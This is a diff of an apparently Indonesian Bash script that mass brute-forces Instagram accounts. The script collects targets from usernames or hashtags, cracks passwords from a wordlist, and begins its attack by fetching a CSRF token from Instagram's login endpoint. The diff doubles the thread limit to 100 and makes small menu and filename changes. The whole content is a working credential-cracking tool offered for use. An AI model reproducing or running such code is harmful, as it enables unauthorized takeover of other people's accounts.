@@ -9,7 +9,7 @@ cyan='\e[1;36m'
 white='\e[1;37m'
 
 # thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
-limit=50
+limit=100
 
 # banner
 echo -e ${red}''' ███╗   ███╗██████╗ ███████╗     ██╗ ██████╗
@@ -37,7 +37,7 @@ echo -e '''
 1]. Dapatkan target dari \e[1;31m@username\e[1;37m
 2]. Dapatkan target dari \e[1;31m#hashtag\e[1;37m
 3]. Crack dari wordlist
-4]. IG Tools V.2 ? \e[1;32m(MBF-BOT IG-AUTOFOLLOWERS)
+
 '''
 
 read -p $'Pilihan     : \e[1;31m' opt
@@ -87,7 +87,7 @@ fi
         echo -e "${white}options are not on the menu"
         sleep 1
         clear
-        bash a.sh
+        bash Run.sh
 esac
 # start_brute
 token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
